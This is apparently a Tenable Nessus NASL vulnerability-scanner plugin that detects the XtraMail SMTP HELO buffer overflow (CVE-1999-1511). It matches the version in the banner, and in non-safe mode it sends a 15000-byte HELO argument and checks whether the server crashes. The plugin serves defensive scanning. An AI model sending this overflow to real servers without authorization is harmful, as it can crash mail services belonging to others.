#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN

include("compat.inc");

if(description)
{
 script_id(10324);
 script_version ("$Revision: 1.29 $");
 script_cve_id("CVE-1999-1511");
 script_bugtraq_id(791);
 script_xref(name:"OSVDB", value:"252");
 
 script_name(english:"XtraMail SMTP HELO Command Remote Overflow");
 script_summary(english:"Attempts to overflow the HELO buffer");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote host is running a mail server with a remote buffer\n",
     "overflow vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running a version of XtraMail with a\n",
     "remote buffer overflow vulnerability. The overflow is caused by\n",
     "by issuing the 'HELO' command, followed by a long argument.\n\n",
     "The HELO command is typically one of the first commands required\n",
     "by a mail server.  The command is used by the mail server as a\n",
     "first attempt to allow the client to identify itself.  As such, this\n",
     "command occurs before there is any authentication or validation of\n",
     "mailboxes, etc.\n\n",
     "This issue may allow an attacker to crash the mail server, or\n",
     "possibly execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/ntbugtraq/1999-q3/0362.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact the vendor for a patch."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl", "slmail_helo.nasl", "csm_helo.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( egrep(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
Nessus reports this vulnerability using only information that was 
gathered. Use caution when testing without safe checks enabled.";
     security_hole(port:port, extra: data);
    }
  }
 }
 exit(0);
}

if (report_paranoia < 2) exit(0);

if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/helo_overflow"));
 if(key) exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if(!s)exit(0);
  if(!("220 " >< s)){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(15000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
    close(soc);
    soc = open_sock_tcp(port);
    if(soc) s = smtp_recv_banner(socket:soc);
    else s = NULL;
    if(!s)security_hole(port);
  }
    close(soc);
 }
}
